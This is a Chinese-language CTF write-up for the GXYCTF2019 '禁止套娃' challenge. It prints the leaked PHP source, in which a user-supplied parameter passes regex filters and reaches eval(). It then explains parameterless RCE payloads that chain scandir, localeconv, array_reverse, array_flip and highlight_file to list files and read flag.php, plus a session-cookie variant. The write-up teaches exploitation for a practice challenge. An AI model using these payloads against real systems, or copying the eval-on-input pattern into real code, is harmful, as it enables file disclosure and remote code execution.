三十二、

题目

[GXYCTF2019]禁止套娃

分析

源码什么也没有，robots.txt、www.zip、index.phps都没有，然后扫目录，也没有什么
看WP吧
/.git泄露？？？？？？
为什么我扫不出来，而且GitHack后什么也没有？？？？
…………………..
泄露的源码： 

<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

第一个if,过滤了伪协议
第二个if，要求不能有参数，(?R)表示引用当前表达式，多一个?表示可以引用，也可以不引用；这里也就是可以配a()、ab(a())....
第三个if，匹配一些字符
$exp中不能含参
首先扫描目录中的文件
scandir('.') ，需要构造个点儿
localeconv()函数会返回包含本地数字及货币格式信息的数组，数组的第一项就是点；current()函数返回数组当前单元，默认为第一项
payload：print_r(scandir(current(localeconv())));

接下来读取flag.php
et被过了，可以用highlight_file
next()函数可以读取数组中的下一个,但next不能套next
array_resverse()可以现将数组反转
然后读取第二个

解

payload：?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));

解法二
arry_flip()函数，交换数组的键和值
arry_rand()函数，从数组中随机取出一个或多个单元
payload：?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));
解法三
使用session
session_start()开启
session_id()获取当前的session id
需要手动设置Cookie: PHPSESSID=flag.php

###知识点
无参数RCE
